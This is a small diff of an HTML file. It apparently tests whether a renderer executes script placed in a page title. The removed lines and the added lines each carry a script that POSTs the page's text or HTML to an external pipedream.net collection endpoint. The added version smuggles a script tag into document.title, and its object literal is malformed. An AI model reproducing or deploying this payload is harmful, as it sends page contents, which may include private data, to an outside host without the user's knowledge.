@@ -1,13 +1,8 @@
 <html>
   <body>
-    <title>
-        <script>
-                fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {
-                method: 'POST',
-                body: JSON.stringify(document.documentElement.innerText),
-                headers: { 'Content-Type': 'application/json' }
-            })
-        </script>
-    </title>
+    <title>Something</title>
+    <script>
+        document.title = '<script>fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify({document.documentElement.innerHTML})})</script>';
+    </script>
   </body>
 </html>
